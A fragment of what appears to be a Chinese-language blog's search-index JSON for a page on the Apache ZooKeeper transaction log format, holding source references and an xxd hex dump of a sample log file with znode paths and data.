三部分构成\nlog.500000004 文件分析分析的日志文件 log.500000004","references#References":" zookeeper/server/persistence ZooDefs#OpCode FileTxnLog.java Util#makeLogName log.500000004 zklogtool hexyl-二进制分析工具 dataLogDir ","二进制文件查看#二进制文件查看":" xxd log.500000004.new|head -n 50 00000000: 5a4b 4c47 0000 0002 0000 0000 0000 0000 ZKLG............ 00000010: 0000 0000 eaa1 0b2a 0000 0030 0300 c755 .......*...0...U 00000020: cf61 0000 0000 0000 0000 0005 0000 0004 .a.............. 00000030: 0000 018b 1815 73ab ffff fff6 0000 7530 ......s.......u0 00000040: 0000 0002 0000 000a a5c7 7377 4200 0000 ..........swB... 00000050: 005f 8e12 2a00 0000 5f03 00c7 55cf 6100 ._..*..._...U.a. 00000060: 0000 0000 0100 0000 0500 0000 0500 0001 ................ 00000070: 8b18 159e 3300 0000 0100 0000 0b2f 612f ....3......../a/ 00000080: 7374 6172 6475 7374 ffff ffff 0000 0001 stardust........ 00000090: 0000 001f 0000 0005 776f 726c 6400 0000 ........world... 000000a0: 0661 6e79 6f6e 6500 0000 000d 0000 0002 .anyone......... 000000b0: 0000 000c 6113 4355 4200 0000 0007 0a0e ....a.CUB....... 000000c0: 4000 0000 4c03 00c7 55cf 6100 0000 0000 @...L...U.a..... 000000d0: 0200 0000 0500 0000 0600 0001 8b18 15e5 ................ 000000e0: b800 0000 0500 0000 0b2f 612f 7374 6172 ........./a/star 000000f0: 6475 7374 0000 0009 7468 6553 686f 6775 dust....theShogu 00000100: 6e00 0000 0100 0000 0200 0000 0c14 8609 n............... 00000110: d442 0000 0000 e9ee 12d7 0000 0058 0300 .B...........X.. 00000120: c755 cf61 0000 0000 0003 0000 0005 0000 .U.a............ 00000130: 0007 0000 018b 1816 66ef 0000 0005 0000 ........f....... 00000140: 000b 2f61 2f73 7461 7264 7573 7400 0000 ../a/stardust... 00000150: 1574 6865 3133 4c6f 6164 734f 6654 6865 .the13LoadsOfThe 00000160: 5368 6f67 756e 0000 0002 0000 0002 0000 Shogun.......... 00000170: 000c 39b4 35f7 4200 0000 001a cb0a c700 ..9.5.B......... 00000180: 0000 3b03 00c7 55cf 6100 0000 0000 0500 ..;...U.a....... 00000190: 0000 0500 0000 0800 0001 8b18 167c ed00 .............|.. 000001a0: 0000 0200 0000 0b2f 612f 7374 6172 6475 ......./a/stardu 000001b0: 7374 0000 0002 0000 000b 676d 37e4 4200 st........gm7.B. 000001c0: 0000 00ef 370a d300 0000 3003 00c7 55cf ....7.....0...U. 000001d0: 6100 0000 0000 0000 0000 0500 0000 0900 a............... 000001e0: 0001 8b18 16f9 d4ff ffff f500 0000 0000 ................ 000001f0: 0000 0200 0000 0b67 6d37 e442 0000 0000 .......gm7.B.... 00000200: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000210: 0000 0000 0000 0000 0000 0000 0000 0000 ................ 00000220: 0000 0000 0000 0000 0000 0000 0000 0000 ................ ","日志文件命名规则#日志文件命名规则":"","日志文件布局#日志文件布局":""},"title":"Zookeeper Transaction Log"}}